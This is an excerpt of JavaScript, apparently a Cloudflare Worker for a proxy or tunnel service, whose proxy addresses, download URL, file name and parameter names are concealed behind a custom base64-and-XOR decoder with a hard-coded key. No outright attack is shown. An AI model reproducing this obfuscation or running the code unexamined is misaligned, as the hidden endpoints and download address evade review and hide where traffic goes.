...
function depcryptr1_decode(d){
    let k="ARK2028_MARS", r=atob(d), u=new Uint8Array(r.length);
    for(let i=0;i<r.length;i++){
        u[i]=(r.charCodeAt(i)-10)^k.charCodeAt(i%k.length);
    }
...
let pnum = depcryptr1_decode('f3CC');
let paddrs = [
    depcryptr1_decode('OyouVFNlUns2NjtJPjpCJl1dX0VFPYZGPT8='),
    depcryptr1_decode('OyouVFNlUns2NjtJPjpCJmVnTDpEeTtGNg==')
];
let paddr = paddrs[Math.floor(Math.random() * paddrs.length)];
let pDomain = [];
let p64 = true;
let p64DnUrl = depcryptr1_decode('MzBJTE0SIXqGeW2HeoaEJ15mVXxGPkErQg==');
let p64Prefix = depcryptr1_decode('fW6FChReZXR+hTpthW6JEhQ=');
let p64Domain = [];
...
let durl = depcryptr1_decode('MzBJTE0SIXpINDWHPUFJZGNmXUUtPIY6OEluDRQpckMcKBcWKHUeFHt3gxwWEj8gg0MQfXxuhiUqFCclHx0KXxc=');
let fname = depcryptr1_decode('sc785MK3C8TMAMT8177dt9/Hs8TR877ZBcHPt9+2vcPbBQ==');
const dataTypeTr = 'EBMbCxUX';
let enableLog = false;

let ytName = depcryptr1_decode('OUd1Sl9LVz1D');
let tgName = depcryptr1_decode('OUd1Sl9LVz1D');
let ghName = depcryptr1_decode('OUd1Sl9LVz1D');
let bName = depcryptr1_decode('OUd1Sl9LVz1D');
...
export default {
    async fetch(request, env, ctx) {
        try {
            ...
            let prType = url.searchParams.get(depcryptr1_decode('GwoOcHlwaxkS'));
            if (prType) {
